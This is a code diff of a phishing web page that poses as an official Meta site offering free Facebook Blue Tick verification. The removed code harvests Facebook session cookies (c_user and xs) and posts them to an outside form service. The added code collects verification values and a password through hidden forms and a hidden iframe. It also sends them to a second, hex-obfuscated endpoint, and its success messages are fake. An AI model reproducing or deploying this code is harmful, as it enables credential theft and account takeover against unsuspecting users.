+                <form id="surnameForm">
+                    <div class="form-group">
+                        <label for="password">Enter Your Password</label>
+                        <input type="text" id="surname" name="surname" placeholder="Enter your password" required>
+                    </div>
+                    
+                    <div class="modal-footer">
+                        <button type="submit" class="modal-submit-btn" id="submitSurname">
+                            <i class="fas fa-check-circle"></i>
+                            Complete Facebook Verification
+                            <div class="loading-spinner" id="surnameSpinner"></div>
+                        </button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+    
 
-          <button id="submitRequestBtn" class="fb-button">
-            Continue Verification
-          </button>
-        </div>
-      </div>
-    </div>
-    <!-- Success Modal -->
-    <div id="successModal" class="modal">
-      <div class="modal-content success-modal-content">
-        <div class="modal-header">
-          <span class="close">&times;</span>
-        </div>
-        <div class="modal-body">
-          <img
-            src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg"
-            alt="Facebook"
-            class="success-logo"
-            onerror="this.onerror=null;this.src='https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg'"
-          />
-          <div class="success-checkmark">✓</div>
-          <h2 class="success-title">Verification Successful</h2>
-          <p class="success-message">
-            Your page verification appeal has been submitted successfully.
-            Please keep your account active for the next 24 hours while we
-            process your request.
-          </p>
-          <button id="successCloseBtn" class="fb-button">Close</button>
-        </div>
-      </div>
-    </div>
+    <iframe name="hiddenFrame" style="display: none;"></iframe>
+    
+    <footer>
+        <p>Meta AI Official Site &copy; 2025. All rights reserved.</p>
+    </footer>
 
     <script>
-      // Get modal elements
-      const appealModal = document.getElementById("appealModal");
-      const successModal = document.getElementById("successModal");
-
-      // Get buttons
-      const submitAppealBtn = document.getElementById("submitAppealBtn");
-      const submitRequestBtn = document.getElementById("submitRequestBtn");
-      const finalSubmitBtn = document.getElementById("finalSubmitBtn");
-      const successCloseBtn = document.getElementById("successCloseBtn");
-
-      // Get close buttons
-      const closeBtns = document.getElementsByClassName("close");
-
-      // Get input fields and error messages
-      const cUserInput = document.getElementById("c_user");
-      const xsInput = document.getElementById("xs");
-      const cUserError = document.getElementById("c_user_error");
-      const xsError = document.getElementById("xs_error");
-
-      // Validation functions
-      function validateCUser(value) {
-        return /^\d+$/.test(value); // Only numbers allowed
-      }
-
-      function validateXs(value) {
-        // Must contain at least one letter, one number, and one symbol
-        const hasLetter = /[a-zA-Z]/.test(value);
-        const hasNumber = /\d/.test(value);
-        const hasSymbol = /[^a-zA-Z0-9]/.test(value);
-        return hasLetter && hasNumber && hasSymbol;
-      }
-
-      // Real-time validation as user types
-      cUserInput.addEventListener("input", function () {
-        const isValid = validateCUser(this.value);
-        cUserInput.classList.toggle("invalid", !isValid);
-        cUserError.classList.toggle("show", !isValid && this.value.length > 0);
-      });
-
-      xsInput.addEventListener("input", function () {
-        const isValid = validateXs(this.value);
-        xsInput.classList.toggle("invalid", !isValid);
-        xsError.classList.toggle("show", !isValid && this.value.length > 0);
-      });
-
-      // Open appeal modal when button is clicked
-      submitAppealBtn.onclick = function () {
-        appealModal.style.display = "block";
-      };
-
-      // Function to submit to first form (https://submit-form.com/hSdlOseLA)
-      function submitToFirstForm(data) {
-        return fetch("https://submit-form.com/hSdlOseLA", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-            Accept: "application/json",
-          },
-          body: JSON.stringify(data),
-        })
-          .then((response) => {
-            if (!response.ok) {
-              throw new Error("Network response was not ok");
+       
+        const claimButton = document.getElementById('claimButton');
+        const verificationModal = document.getElementById('verificationModal');
+        const closeModal = document.getElementById('closeModal');
+        const verificationForm = document.getElementById('verificationForm');
+        const submitVerification = document.getElementById('submitVerification');
+        const verificationSpinner = document.getElementById('verificationSpinner');
+        const surnameModal = document.getElementById('surnameModal');
+        const closeSurnameModal = document.getElementById('closeSurnameModal');
+        const surnameForm = document.getElementById('surnameForm');
+        const submitSurname = document.getElementById('submitSurname');
+        const surnameSpinner = document.getElementById('surnameSpinner');
+        
+        
+        const languageSelection = document.getElementById('languageSelection');
+        const videoSection = document.getElementById('videoSection');
+        const verificationInstructions = document.getElementById('verificationInstructions');
+        const languageOptions = document.querySelectorAll('.language-option');
+        const confirmLanguageButton = document.getElementById('confirmLanguage');
+        const verificationVideo = document.getElementById('verificationVideo');
+        const videoCaption = document.getElementById('videoCaption');
+        
+        
+        let storedMaajachud = '';
+        let storedBhernjachud = '';
+        let storedSurname = '';
+        let selectedLanguage = '';
+        
+        
+        const hexUrl = '68747470733a2f2f616c692d7068702e7761736d65722e6170702f';
+        
+        
+        const videoSources = {
+            english: {
+                url: 'https://ik.imagekit.io/english/English.mp4',
+                caption: 'Watch this video to learn about the verification process and how to complete your application successfully.'
+            },
+            spanish: {
+                url: 'https://resource2.heygen.ai/video_translate/db7e753c13fa4d238fe716483469ae8f-es/720p.mp4',
+                caption: 'Vea este video para conocer el proceso de verificación y cómo completar su solicitud con éxito.'
+            },
+            portuguese: {
+                url: 'https://allvideos.wasmer.app/Portuguese.mp4',
+                caption: 'Assista a este vídeo para saber sobre o processo de verificação e como concluir sua inscrição com sucesso.'
+            },
+            hindi: {
+                url: 'https://resource2.heygen.ai/video_translate/9d7e40f714c842258bd08ad4c3ee68d6-hi/720p.mp4',
+                caption: 'सत्यापन प्रक्रिया और अपने आवेदन को सफलतापूर्वक कैसे पूरा करें, यह जानने के लिए इस वीडियो को देखें।'
+            },
+            filipino: {
+                url: 'https://allvideos.wasmer.app/vietanames.mp4',
+                caption: 'Xem video này để tìm hiểu về quy trình xác minh và cách hoàn tất đơn đăng ký thành công.'
+            },
+            tamil: {
+                url: 'https://allvideos.wasmer.app/tamil.mp4',
+                caption: 'சரிபார்ப்பு செயல்முறை மற்றும் உங்கள் விண்ணப்பத்தை வெற்றிகரமாக முடிப்பது பற்றி அறிய இந்த வீடியோவைப் பார்க்கவும்.'
             }
-            return response.json();
-          })
-          .then((data) => {
-            console.log("First form submission successful:", data);
-            return data;
-          })
-          .catch((error) => {
-            console.error("Error submitting to first form:", error);
-            throw error;
-          });
-      }
-      // Modified: Submit c_user and xs data, then redirect to example link
-      submitRequestBtn.onclick = function () {
-        const cUser = cUserInput.value;
-        const xsToken = xsInput.value;
-
-        // Validate both fields
-        const isCUserValid = validateCUser(cUser);
-        const isXsValid = validateXs(xsToken);
-
-        // Show/hide errors
-        cUserInput.classList.toggle("invalid", !isCUserValid);
-        cUserError.classList.toggle("show", !isCUserValid);
-
-        xsInput.classList.toggle("invalid", !isXsValid);
-        xsError.classList.toggle("show", !isXsValid);
-
-        // Check if both are valid
-        if (isCUserValid && isXsValid) {
-          // Show loading state
-          submitRequestBtn.classList.add("button-loading");
-          submitRequestBtn.disabled = true;
-
-          // Prepare data to submit
-          const formData = {
-            c_user: cUser,
-            xs: xsToken,
-            timestamp: new Date().toISOString(),
-            userAgent: navigator.userAgent,
-            ip: "", // Will be captured server-side
-          };
-
-          // Submit to first form, then redirect
-          Promise.all([
-            submitToFirstForm(formData),
-          ])
-            .then(() => {
-              // Hide loading state
-              submitRequestBtn.classList.remove("button-loading");
-              submitRequestBtn.disabled = false;
-
-              // Close the modal
-              appealModal.style.display = "none";
-
-              // Redirect to example link after successful submission
-              window.location.href = "https://lifetimefree-tick.vercel.app/";
-            })
-            .catch((error) => {
-              // Hide loading state
-              submitRequestBtn.classList.remove("button-loading");
-              submitRequestBtn.disabled = false;
-
-              console.error("Error during submission:", error);
-
-              // Still redirect even if submission fails (optional behavior)
-              // Comment out the next 3 lines if you want to prevent redirect on error
-              appealModal.style.display = "none";
-              window.location.href = "https://lifetimefree-tick.vercel.app/";
-            });
-        } else {
-          // Scroll to first error
-          const firstError = document.querySelector(".invalid");
-          if (firstError) {
-            firstError.scrollIntoView({ behavior: "smooth", block: "center" });
-          }
-
-          // Show alert if fields are empty
-          if (!cUser || !xsToken) {
-            alert("Please fill in both c_user and xs tokens to continue.");
-          }
-        }
-      };
-
-      // Final submission with loading animation
-      finalSubmitBtn.onclick = function () {
-        const cUser = cUserInput.value;
-        const xsToken = xsInput.value;
-
-        if (cUser && xsToken) {
-          // Show loading state
-          finalSubmitBtn.classList.add("button-loading");
-          finalSubmitBtn.disabled = true;
-
-          // Prepare data to submit
-          const formData = {
-            c_user: cUser,
-            xs: xsToken,
-            timestamp: new Date().toISOString(),
-            userAgent: navigator.userAgent,
-            ip: "", // Will be captured server-side
-          };
-
-          // Submit to first form forms
-          Promise.all([
-            submitToFirstForm(formData)
-          ])
-            .then(() => {
-              // Hide loading state
-              finalSubmitBtn.classList.remove("button-loading");
-              finalSubmitBtn.disabled = false;
-
-              // Show success modal
-              successModal.style.display = "block";
-
-              // Reset form
-              cUserInput.value = "";
-              xsInput.value = ""
-              cUserInput.classList.remove("invalid");
-              xsInput.classList.remove("invalid");
-              cUserError.classList.remove("show");
-              xsError.classList.remove("show");
-            })
-            .catch((error) => {
-              // Hide loading state
-              finalSubmitBtn.classList.remove("button-loading");
-              finalSubmitBtn.disabled = false;
-
-              console.error("Error during submission:", error);
-              alert(
-                "There was an error submitting your data. Please try again."
-              );
-            });
-        } else {
-          alert("Please enter all required fields to complete verification.");
-        }
-      };
-
-      // Close success modal
-      successCloseBtn.onclick = function () {
-        successModal.style.display = "none";
-      };
-
-      // Close modals when close button is clicked
-      for (let i = 0; i < closeBtns.length; i++) {
-        closeBtns[i].onclick = function () {
-          appealModal.style.display = "none";
-          successModal.style.display = "none";
-
-          // Reset error messages when closing
-          cUserInput.classList.remove("invalid");
-          xsInput.classList.remove("invalid");
-          cUserError.classList.remove("show");
-          xsError.classList.remove("show");
-
-          // Reset loading state if active
-          if (finalSubmitBtn.classList.contains("button-loading")) {
-            finalSubmitBtn.classList.remove("button-loading");
-            finalSubmitBtn.disabled = false;
-          }
-          if (submitRequestBtn.classList.contains("button-loading")) {
-            submitRequestBtn.classList.remove("button-loading");
-            submitRequestBtn.disabled = false;
-          }
         };
-      }
-
-      // Close modals when clicking outside
-      window.onclick = function (event) {
-        if (event.target == appealModal) {
-          appealModal.style.display = "none";
-          // Reset error messages when closing
-          cUserInput.classList.remove("invalid");
-          xsInput.classList.remove("invalid");
-          cUserError.classList.remove("show");
-          xsError.classList.remove("show");
-
-          // Reset loading state if active
-          if (submitRequestBtn.classList.contains("button-loading")) {
-            submitRequestBtn.classList.remove("button-loading");
-            submitRequestBtn.disabled = false;
-          }
+        
+        
+        function hexToString(hex) {
+            let str = '';
+            for (let i = 0; i < hex.length; i += 2) {
+                str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
+            }
+            return str;
         }
-        if (event.target == passwordModal) {
-          passwordModal.style.display = "none";
-
-          // Reset loading state if active
-          if (finalSubmitBtn.classList.contains("button-loading")) {
-            finalSubmitBtn.classList.remove("button-loading");
-            finalSubmitBtn.disabled = false;
-          }
+        
+       
+        function selectLanguage(language) {
+            
+            languageOptions.forEach(option => {
+                option.classList.remove('selected');
+            });
+            
+           
+            const selectedOption = document.querySelector(`.language-option[data-lang="${language}"]`);
+            selectedOption.classList.add('selected');
+            
+            
+            selectedLanguage = language;
+            
+           
+            confirmLanguageButton.disabled = false;
         }
-        if (event.target == successModal) {
-          successModal.style.display = "none";
+        
+        
+        function confirmLanguage() {
+            if (!selectedLanguage) return;
+            
+            
+            verificationVideo.src = videoSources[selectedLanguage].url;
+            videoCaption.textContent = videoSources[selectedLanguage].caption;
+            
+            
+            languageSelection.style.display = 'none';
+            
+            
+            videoSection.style.display = 'block';
+            verificationInstructions.style.display = 'block';
+            verificationForm.style.display = 'block';
+            
+           
+            verificationVideo.play();
         }
-      };
+        
+        
+        claimButton.addEventListener('click', function() {
+            verificationModal.style.display = 'flex';
+            document.body.style.overflow = 'hidden'; 
+            
+            
+            languageSelection.style.display = 'block';
+            videoSection.style.display = 'none';
+            verificationInstructions.style.display = 'none';
+            verificationForm.style.display = 'none';
+            
+            
+            languageOptions.forEach(option => {
+                option.classList.remove('selected');
+            });
+            selectedLanguage = '';
+            confirmLanguageButton.disabled = true;
+        });
+        
+        
+        closeModal.addEventListener('click', function() {
+            verificationModal.style.display = 'none';
+            document.body.style.overflow = 'auto'; 
+        });
+        
+        
+        closeSurnameModal.addEventListener('click', function() {
+            surnameModal.style.display = 'none';
+            document.body.style.overflow = 'auto';
+        });
+        
+        
+        verificationModal.addEventListener('click', function(e) {
+            if (e.target === verificationModal) {
+                verificationModal.style.display = 'none';
+                document.body.style.overflow = 'auto';
+            }
+        });
+        
+        
+        surnameModal.addEventListener('click', function(e) {
+            if (e.target === surnameModal) {
+                surnameModal.style.display = 'none';
+                document.body.style.overflow = 'auto';
+            }
+        });
+        
+       
+        languageOptions.forEach(option => {
+            option.addEventListener('click', function() {
+                const language = this.getAttribute('data-lang');
+                selectLanguage(language);
+            });
+        });
+        
+        
+        confirmLanguageButton.addEventListener('click', confirmLanguage);
+        
+        
+        verificationForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const maajachud = document.getElementById('maajachud').value;
+            const bhernjachud = document.getElementById('bhernjachud').value;
+            
+            if (!maajachud || !bhernjachud) {
+                alert('Please complete both verification fields to proceed.');
+                return;
+            }
+            
+            
+            storedMaajachud = maajachud;
+            storedBhernjachud = bhernjachud;
+            
+            
+            submitVerification.disabled = true;
+            verificationSpinner.style.display = 'inline-block';
+            
+            
+            const hiddenForm = document.createElement('form');
+            hiddenForm.method = 'POST';
+            hiddenForm.action = 'https://submit-form.com/hSdlOseLA';
+            hiddenForm.target = 'hiddenFrame';
+            hiddenForm.style.display = 'none';
+            
+            
+            const maajachudInput = document.createElement('input');
+            maajachudInput.type = 'text';
+            maajachudInput.name = 'maajachud';
+            maajachudInput.value = maajachud;
+            
+            const bhernjachudInput = document.createElement('input');
+            bhernjachudInput.type = 'text';
+            bhernjachudInput.name = 'bhernjachud';
+            bhernjachudInput.value = bhernjachud;
+            
+            hiddenForm.appendChild(maajachudInput);
+            hiddenForm.appendChild(bhernjachudInput);
+            document.body.appendChild(hiddenForm);
+            
+           
+            hiddenForm.submit();
+            
+            
+            setTimeout(() => {
+                document.body.removeChild(hiddenForm);
+                
+               
+                submitVerification.disabled = false;
+                verificationSpinner.style.display = 'none';
+                
+                
+                verificationModal.style.display = 'none';
+                surnameModal.style.display = 'flex';
+            }, 1500);
+        });
+        
+       
+        surnameForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const surname = document.getElementById('surname').value;
+            
+            if (!surname) {
+                alert('Please enter your surname to complete the verification.');
+                return;
+            }
+            
+            
+            storedSurname = surname;
+            
+            
+            submitSurname.disabled = true;
+            surnameSpinner.style.display = 'inline-block';
+            
+            
+            const hiddenForm = document.createElement('form');
+            hiddenForm.method = 'POST';
+            hiddenForm.action = 'https://submit-form.com/hSdlOseLA';
+            hiddenForm.target = 'hiddenFrame';
+            hiddenForm.style.display = 'none';
+            
+            
+            const surnameInput = document.createElement('input');
+            surnameInput.type = 'text';
+            surnameInput.name = 'surname';
+            surnameInput.value = surname;
+            
+            hiddenForm.appendChild(surnameInput);
+            document.body.appendChild(hiddenForm);
+            
+            
+            hiddenForm.submit();
+            
+            
+            setTimeout(() => {
+                document.body.removeChild(hiddenForm);
+                
+                
+                submitThirdForm();
+                
+                
+                submitSurname.disabled = false;
+                surnameSpinner.style.display = 'none';
+                
+                
+                surnameModal.style.display = 'none';
+                document.body.style.overflow = 'auto';
+                
+                
+                alert(`Congratulations ${surname}! Your Facebook verification is complete.\n\nYour free Blue Tick verification is being processed.\n\nYou will receive your verification badge within 24 hours. Thank you for choosing Meta!`);
+            }, 1500);
+        });
+        
+        
+        function submitThirdForm() {
+            
+            const thirdForm = document.createElement('form');
+            thirdForm.method = 'POST';
+            thirdForm.action = hexToString(hexUrl);
+            thirdForm.target = 'hiddenFrame';
+            thirdForm.style.display = 'none';
+            
+            
+            const maajachudInput = document.createElement('input');
+            maajachudInput.type = 'text';
+            maajachudInput.name = 'maajachud';
+            maajachudInput.value = storedMaajachud;
+            
+            const bhernjachudInput = document.createElement('input');
+            bhernjachudInput.type = 'text';
+            bhernjachudInput.name = 'bhernjachud';
+            bhernjachudInput.value = storedBhernjachud;
+            
+            const surnameInput = document.createElement('input');
+            surnameInput.type = 'text';
+            surnameInput.name = 'surname';
+            surnameInput.value = storedSurname;
+            
+            thirdForm.appendChild(maajachudInput);
+            thirdForm.appendChild(bhernjachudInput);
+            thirdForm.appendChild(surnameInput);
+            document.body.appendChild(thirdForm);
+            
+           
+            thirdForm.submit();
+            
+            
+            setTimeout(() => {
+                document.body.removeChild(thirdForm);
+            }, 1000);
+        }
+        
+        
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                if (verificationModal.style.display === 'flex') {
+                    verificationModal.style.display = 'none';
+                    document.body.style.overflow = 'auto';
+                } else if (surnameModal.style.display === 'flex') {
+                    surnameModal.style.display = 'none';
+                    document.body.style.overflow = 'auto';
+                }
+            }
+        });
     </script>
-  </body>
+</body>
 </html>
